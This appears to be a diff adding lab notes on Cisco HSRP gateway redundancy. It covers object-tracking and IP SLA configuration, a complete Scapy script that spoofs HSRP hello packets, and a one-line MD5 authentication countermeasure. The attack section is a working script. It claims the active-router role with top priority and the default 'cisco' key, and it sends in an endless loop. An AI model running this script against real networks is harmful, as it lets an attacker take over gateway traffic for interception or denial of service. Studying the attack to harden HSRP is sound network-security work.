@@ -1,0 +1,68 @@
+Object tracking:
+track 1 interface f0/1 line-protocol
+exit
+int f0/0
+standby 1 ip 192.168.1.254
+standby 1 preempt
+standby 1 track 1 decrement 80
+
+IP SLA:
+ip sla 1
+icmp-echo 1.1.1.1
+frequency 10
+exit
+ip sla schedule 1 start-time now life forever
+track 1 ip sla 1
+int f0/0
+standby 1 ip 192.168.1.254
+standby 1 preempt
+standby 1 track 1 decrement 80
+
+
+Attack:
+from scapy.all import Ether, IP, UDP, sendp, Packet, ByteField, StrFixedLenField, bind_layers
+import time
+
+# Define HSRP Layer with authentication
+class HSRP(Packet):
+    name = "HSRP"
+    fields_desc = [
+        ByteField("version", 0),
+        ByteField("opcode", 0),       # 0 = Hello
+        ByteField("state", 16),       # 16 = Active
+        ByteField("hellotime", 3),
+        ByteField("holdtime", 10),
+        ByteField("priority", 255),
+        ByteField("group", 1),
+        ByteField("reserved", 0),
+        StrFixedLenField("auth", b"cisco\x00\x00\x00", length=8),
+        StrFixedLenField("virtual_ip", b"\xC0\xA8\x01\xFE", length=4)  # 192.168.1.254
+    ]
+
+# Bind HSRP to UDP on port 1985
+bind_layers(UDP, HSRP, sport=1985, dport=1985)
+
+# Build spoofed HSRP packet
+def build_hsrp_packet(src_ip, iface):
+    ether = Ether(dst="01:00:5e:00:00:02")
+    ip = IP(src=src_ip, dst="224.0.0.2")
+    udp = UDP(sport=1985, dport=1985)
+    hsrp = HSRP()
+    packet = ether / ip / udp / hsrp
+    return packet
+
+# Send spoofed packets in a loop
+def send_spoofed_hsrp(src_ip="192.168.1.250", iface="eth0"):
+    packet = build_hsrp_packet(src_ip, iface)
+    print(f"[+] Spoofing HSRP as Active with IP {src_ip} on interface {iface}")
+    while True:
+        sendp(packet, iface=iface, verbose=False)
+        time.sleep(3)
+
+if __name__ == "__main__":
+    send_spoofed_hsrp()
+    
+CounterMeausure:
+int f0/0
+standby 1 authentication md5 key-string MY_SECRET_KEY
+
